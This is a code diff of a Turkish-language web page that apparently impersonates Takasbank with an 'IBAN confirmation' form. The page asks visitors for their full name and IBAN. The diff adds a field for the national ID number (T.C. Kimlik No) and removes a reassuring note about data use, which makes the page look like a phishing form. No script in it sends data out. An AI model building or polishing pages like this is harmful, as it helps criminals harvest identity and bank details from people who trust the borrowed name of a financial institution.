@@ -3,89 +3,64 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title>TAKASBANK ONAYLI IBAN BİLDİRİMİ</title>
+  <title>TAKASBANK IBAN ONAY</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f9f9f9;
+      background: #f8f8f8;
       margin: 0;
       padding: 0;
     }
     .container {
       text-align: center;
-      padding: 50px 20px;
+      padding-top: 60px;
     }
     .logo {
-      width: 50%;
-      max-width: 600px;
+      width: 200px;
       height: auto;
-      margin-bottom: 40px;
+      margin-bottom: 20px;
     }
     h1 {
       color: #003366;
-      margin-bottom: 20px;
-      font-size: 24px;
+      margin-bottom: 10px;
     }
     p {
       color: #333;
       margin-bottom: 30px;
-      font-size: 16px;
     }
     input[type="text"] {
       width: 60%;
-      padding: 12px;
+      padding: 10px;
       font-size: 16px;
-      margin-bottom: 20px;
+      margin-bottom: 15px;
       display: block;
       margin-left: auto;
       margin-right: auto;
-      border: 1px solid #ccc;
-      border-radius: 5px;
     }
     button {
-      padding: 12px 30px;
+      padding: 10px 25px;
       font-size: 16px;
       background-color: #003366;
       color: white;
       border: none;
-      border-radius: 5px;
       cursor: pointer;
     }
     button:hover {
       background-color: #005599;
     }
-    .info-box {
-      margin-top: 100px;
-      background-color: #e6f0ff;
-      border-left: 5px solid #003366;
-      padding: 25px;
-      width: 80%;
-      margin-left: auto;
-      margin-right: auto;
-      text-align: left;
-      color: #003366;
-      font-size: 15px;
-      border-radius: 5px;
-      line-height: 1.6;
-    }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="logo.png" alt="Takasbank Logo" class="logo">
-    <h1>TAKASBANK ONAYLI IBAN BİLDİRİMİ</h1>
-    <p>Lütfen aşağıdaki bilgileri eksiksiz giriniz:</p>
+    <img src="logo.png" alt="Logo" class="logo">
+    <h1>TAKASBANK IBAN ONAY</h1>
+    <p>Lütfen aşağıdaki bilgileri eksiksiz doldurunuz:</p>
     <form>
       <input type="text" name="fullname" placeholder="Ad Soyad" required>
+      <input type="text" name="tc" placeholder="T.C. Kimlik No" required>
       <input type="text" name="iban" placeholder="TR00 0000 0000 0000 0000 0000 00" required>
       <button type="submit">Gönder</button>
     </form>
-    <div class="info-box">
-      <strong>Bilgilendirme:</strong><br>
-      Bu form aracılığıyla girilen IBAN bilgileri, Takasbank sistemi üzerinden doğrulanmak üzere alınmaktadır.<br>
-      Gönderdiğiniz bilgiler yalnızca doğrulama amaçlı kullanılır ve kesinlikle üçüncü kişilerle paylaşılmaz.<br>
-      Lütfen yalnızca kendinize ait ve aktif bir IBAN bilgisi giriniz.
-    </div>
   </div>
 </body>
 </html>
